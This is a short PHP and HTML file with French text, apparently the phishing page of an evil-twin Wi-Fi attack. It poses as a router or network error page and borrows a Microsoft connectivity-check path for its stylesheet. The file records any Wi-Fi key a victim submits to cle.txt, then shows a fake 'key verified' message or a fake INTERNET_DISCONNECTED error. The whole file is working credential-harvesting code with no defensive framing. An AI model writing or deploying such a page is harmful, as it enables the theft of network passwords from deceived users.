<?php
$cle = $_POST['cle'];
$cleconf = $_POST['cleconf'];
$fp = fopen("cle.txt","a+"); // ouverture du fichier en écriture
fputs($fp, "$cle");
fputs($fp, "$cleconf");
fclose($fp);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="/msftconnecttest/style.css" media="screen" type="text/css" />
<title>Page introuvable</title>
</meta>
</head>
<body>
	 <?php
            if (!empty($_POST['cle']) && !empty($_POST['cleconf']) ) // Vérifie si les variables des clés ne sont pas vides
        {
			$cle=$_POST['cle'];
			$cleconf=$_POST['cleconf'];
		
				if ( $cle == $cleconf) // Vérifie si les deux clés sont identiques
            {
					if (strlen($cle) >7 && strlen($cle) <63 )
				{                 
					?>	
				<h1>Authentification</h1>
			</p>
			<p>
Clé vérifiée, patientez un moment ou redémarrez votre routeur.</p>
<?php
                }
				
					 if (strlen($cle) <7)
				{
					?>
					<h1> Erreur ! </h1>
			Détail : INTERNET_DISCONNECTED 
			<br/>Se reconnecter au réseau Wi-Fi <a href="index.php"></a>
					<?php
				}
			
				if (strlen($cle) >63)
				{
					?>
					<h1> Erreur ! </h1>
			Détail : INTERNET_DISCONNECTED 
			<br/>Se reconnecter au réseau Wi-Fi <a href="index.php"></a>
					<?php
				}	
            }
			
				else
            {
				?>
				<h1> Erreur ! </h1>
			Détail : INTERNET_DISCONNECTED 
			<br/>Se reconnecter au réseau Wi-Fi <a href="index.php"></a>
				<?php
			}
        }
			
			else
        {
			?>		
			<h1> Erreur ! </h1>
			Détail : INTERNET_DISCONNECTED 
			<br/>Se reconnecter au réseau Wi-Fi <a href="index.php"></a>
			<?php
        }
        ?>
</br>
</br>
	</body>
</html>

